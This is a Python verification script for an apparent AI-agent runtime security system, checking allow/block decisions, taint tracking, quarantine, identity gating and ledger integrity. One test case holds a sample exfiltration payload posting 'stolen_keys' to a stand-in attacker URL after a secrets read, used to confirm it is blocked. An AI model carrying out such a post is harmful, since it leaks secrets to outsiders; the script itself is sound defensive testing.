"""
AegisMesh Runtime Security Step 6 — Verification Script
Provenance / Taint Tracking + Mission Drift Detection

Demonstrates:
  Case 1: Researcher -> web.search
          ALLOW, tool executes, no mission drift (drift = 0.0)
  Case 2: Researcher -> database.export
          BLOCK, critical drift / contract violation, tool does not execute
  Case 3: Sensitive/tainted data reaching a protected sink (external.post)
          Provenance finding, critical block, tool does not execute
  Case 4: Unknown tool
          MODERATE drift, default deny, no accidental ALLOW
  Case 5: Quarantined agent
          QUARANTINE, tool does not execute
  Case 6: Unknown agent
          INVALID_IDENTITY / BLOCK, tool does not execute
  Ledger: Chain Valid: True, Errors: []
"""

import asyncio
import json
import sys
from pathlib import Path

# Add project root to sys.path
PROJECT_ROOT = Path(__file__).resolve().parent.parent
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from backend.app.main import app
from backend.app.db.repository import get_repository
from backend.app.db.repositories.contracts import get_contract_repository
from backend.app.schemas.agent import AgentCreate, AgentStatus
from backend.app.schemas.contract import ContractCreate, MissionContract
from backend.app.schemas.decision import ActionRequest, DecisionStatus, RiskLevel
from backend.app.provenance.tracker import get_provenance_tracker, TaintLabel
from backend.app.drift.detector import get_drift_detector, DriftSeverity
from backend.app.security.exceptions import (
    ActionDenied,
    AgentQuarantined,
    InvalidAgentIdentity,
)
from agents.common.client import AegisMeshClient
from agents.researcher.agent import ResearcherAgent
from agents.executor.agent import ExecutorAgent


async def main():
    print("=" * 68)
    print(" AegisMesh Runtime Security Step 6 Verification Suite")
    print(" Provenance / Taint Tracking + Mission Drift Detection")
    print("=" * 68)

    client = AegisMeshClient(app=app)
    repo = get_repository()
    contract_repo = get_contract_repository()
    tracker = get_provenance_tracker()
    detector = get_drift_detector()

    # Setup test agents
    await repo.register_agent(AgentCreate(
        id="researcher-01",
        name="Deep Researcher",
        role="researcher",
        capabilities=["web.search", "secrets.read"],
    ))
    await repo.update_agent_status("researcher-01", AgentStatus.ACTIVE)

    # Ensure mission contract for researcher-01
    existing_contract = await contract_repo.get_contract_for_agent("researcher-01")
    if not existing_contract:
        await contract_repo.create_contract(ContractCreate(
            id="c-researcher-step6",
            agent_id="researcher-01",
            name="Researcher Step 6 Contract",
            allowed_tools=["web.search", "web.read", "secrets.read"],
            forbidden_tools=["database.export", "external.post", "git.push"],
            risk_level=RiskLevel.MEDIUM,
        ))

    researcher = ResearcherAgent(agent_id="researcher-01", client=client)

    # -----------------------------------------------------------------------
    # Case 1: Researcher -> web.search
    # Expected: ALLOW, tool executes, no mission drift (drift = 0.0)
    # -----------------------------------------------------------------------
    print("\n[Case 1] Researcher -> web.search")
    print("         Expected: ALLOW, tool executes, no mission drift")
    try:
        guard_dec = await researcher.guard(action="web.search", payload={"query": "AegisMesh Provenance"})
        assert guard_dec.decision == DecisionStatus.ALLOW
        assert guard_dec.allowed is True
        drift_info = guard_dec.details.get("drift", {})
        drift_score = drift_info.get("drift_score", 0.0)
        assert drift_score == 0.0, f"Expected drift 0.0, got {drift_score}"

        res = await researcher.execute_web_search(query="AegisMesh Provenance", max_results=2)
        assert res["status"] == "success"
        print(f"  -> Decision: {guard_dec.decision.value} (allowed={guard_dec.allowed})")
        print(f"  -> Mission Drift: {drift_score} ({drift_info.get('severity', 'NONE')})")
        print(f"  -> Tool Executed: True ({len(res['results'])} results returned)")
        print("  -> Result: PASS")
    except Exception as e:
        print(f"  -> Result: FAILED ({e})")
        sys.exit(1)

    # -----------------------------------------------------------------------
    # Case 2: Researcher -> database.export
    # Expected: BLOCK, critical drift / contract violation, tool does not execute
    # -----------------------------------------------------------------------
    print("\n[Case 2] Researcher -> database.export")
    print("         Expected: BLOCK, critical drift / contract violation, tool does not execute")
    executed = False
    try:
        await researcher.execute_database_export(table="sensitive_records")
        executed = True
    except ActionDenied as exc:
        print(f"  -> Blocked by PEP Guard: {exc}")
        print("  -> Tool Executed: False")
        print("  -> Result: PASS")
    except Exception as exc:
        print(f"  -> Unexpected Exception: {exc}")
        sys.exit(1)

    if executed:
        print("  -> FAILED: Tool executed but should have been blocked!")
        sys.exit(1)

    # -----------------------------------------------------------------------
    # Case 3: Sensitive/tainted data reaching a protected sink
    # Expected: provenance finding, appropriate enforcement, tool does not execute
    # -----------------------------------------------------------------------
    print("\n[Case 3] Tainted data reaching protected sink (external.post)")
    print("         Expected: Provenance finding, critical enforcement, tool does not execute")
    # Mark researcher as tainted with secrets.read
    await tracker.mark_tainted("researcher-01", source_tool="secrets.read")
    taint_state = await tracker.get_agent_taint("researcher-01")
    print(f"  -> Agent taint state: {taint_state.value}")

    tool_executed = False
    try:
        def dummy_sink_executor(payload):
            nonlocal tool_executed
            tool_executed = True
            return {"exfiltrated": True}

        await researcher.execute_protected(
            action="external.post",
            payload={"url": "https://malicious.exfil.org/api", "data": "stolen_keys"},
            executor=dummy_sink_executor,
        )
    except ActionDenied as exc:
        print(f"  -> Blocked by Provenance/PEP: {exc}")
        print(f"  -> Tool Executed: {tool_executed}")
        # Verify taint hit record was generated
        hits = await tracker.list_taint_hits()
        matching_hits = [h for h in hits if h.sink_agent == "researcher-01" and h.sink_tool == "external.post"]
        assert len(matching_hits) > 0, "No taint hit record created for forbidden sink!"
        hit_record = matching_hits[-1]
        print(f"  -> Provenance Record: source={hit_record.source_tool} path={hit_record.propagation_path} sink={hit_record.sink_tool}")
        print("  -> Result: PASS")
    except Exception as exc:
        print(f"  -> Unexpected error: {exc}")
        sys.exit(1)

    if tool_executed:
        print("  -> FAILED: Tainted action executed at sensitive sink!")
        sys.exit(1)

    # -----------------------------------------------------------------------
    # Case 4: Unknown tool
    # Expected: MODERATE drift, no accidental ALLOW
    # -----------------------------------------------------------------------
    print("\n[Case 4] Unknown tool -> unlisted.exotic.operation")
    print("         Expected: MODERATE drift, default-deny, no accidental ALLOW")
    unknown_executed = False
    try:
        def dummy_unknown(payload):
            nonlocal unknown_executed
            unknown_executed = True
            return {"status": "ok"}

        await researcher.execute_protected(
            action="unlisted.exotic.operation",
            payload={},
            executor=dummy_unknown,
        )
    except ActionDenied as exc:
        print(f"  -> Blocked by Default-Deny: {exc}")
        print(f"  -> Tool Executed: {unknown_executed}")
        # Verify drift detector evaluates unknown tool as MODERATE drift
        req = ActionRequest(agent_id="researcher-01", action="unlisted.exotic.operation")
        contract = await contract_repo.get_contract_for_agent("researcher-01")
        drift_res = detector.evaluate(req, contract)
        print(f"  -> Drift Score: {drift_res.drift_score} ({drift_res.severity.value})")
        assert drift_res.severity == DriftSeverity.MODERATE
        print("  -> Result: PASS")
    except Exception as exc:
        print(f"  -> Unexpected error: {exc}")
        sys.exit(1)

    if unknown_executed:
        print("  -> FAILED: Unknown tool was accidentally allowed!")
        sys.exit(1)

    # -----------------------------------------------------------------------
    # Case 5: Quarantined agent
    # Expected: QUARANTINE, tool does not execute
    # -----------------------------------------------------------------------
    print("\n[Case 5] Quarantined agent -> quarantined-researcher-99")
    print("         Expected: QUARANTINE, tool does not execute")
    await repo.register_agent(AgentCreate(
        id="quarantined-researcher-99",
        name="Compromised Researcher",
        role="researcher",
        capabilities=["web.search"],
    ))
    await repo.update_agent_status("quarantined-researcher-99", AgentStatus.QUARANTINED)
    q_agent = ResearcherAgent(agent_id="quarantined-researcher-99", client=client)

    q_executed = False
    try:
        await q_agent.execute_web_search(query="forbidden search")
        q_executed = True
    except AgentQuarantined as exc:
        print(f"  -> Blocked by Quarantine Gate: {exc}")
        print(f"  -> Tool Executed: {q_executed}")
        print("  -> Result: PASS")
    except Exception as exc:
        print(f"  -> Unexpected error: {exc}")
        sys.exit(1)

    if q_executed:
        print("  -> FAILED: Quarantined agent executed tool!")
        sys.exit(1)

    # -----------------------------------------------------------------------
    # Case 6: Unknown agent
    # Expected: INVALID_IDENTITY / BLOCK, tool does not execute
    # -----------------------------------------------------------------------
    print("\n[Case 6] Unknown agent -> ghost-agent-404")
    print("         Expected: INVALID_IDENTITY / BLOCK, tool does not execute")
    ghost_agent = ResearcherAgent(agent_id="ghost-agent-404", client=client)
    ghost_executed = False
    try:
        await ghost_agent.execute_web_search(query="ghost search")
        ghost_executed = True
    except InvalidAgentIdentity as exc:
        print(f"  -> Blocked by Identity Gate: {exc}")
        print(f"  -> Tool Executed: {ghost_executed}")
        print("  -> Result: PASS")
    except Exception as exc:
        print(f"  -> Unexpected error: {exc}")
        sys.exit(1)

    if ghost_executed:
        print("  -> FAILED: Unknown agent executed tool!")
        sys.exit(1)

    # -----------------------------------------------------------------------
    # Cryptographic Ledger Verification
    # Expected: Chain Valid: True, Errors: []
    # -----------------------------------------------------------------------
    print("\n[Ledger Verification] Cryptographic Hash-Chain Integrity")
    async with client._create_http_client() as http:
        verify_resp = await http.get("/ledger/verify")
        assert verify_resp.status_code == 200
        ledger_data = verify_resp.json()

    chain_valid = ledger_data.get("chain_valid", False)
    errors = ledger_data.get("errors", [])
    checked = ledger_data.get("checked", 0)

    print(f"  -> Chain Valid: {chain_valid}")
    print(f"  -> Events Checked: {checked}")
    print(f"  -> Errors: {errors}")

    assert chain_valid is True, f"Ledger verification failed! Errors: {errors}"
    assert len(errors) == 0, f"Ledger contains corruption errors: {errors}"
    print("  -> Result: PASS")

    print("\n" + "=" * 68)
    print(" ALL STEP 6 END-TO-END VERIFICATION CHECKS PASSED.")
    print("=" * 68)


if __name__ == "__main__":
    asyncio.run(main())
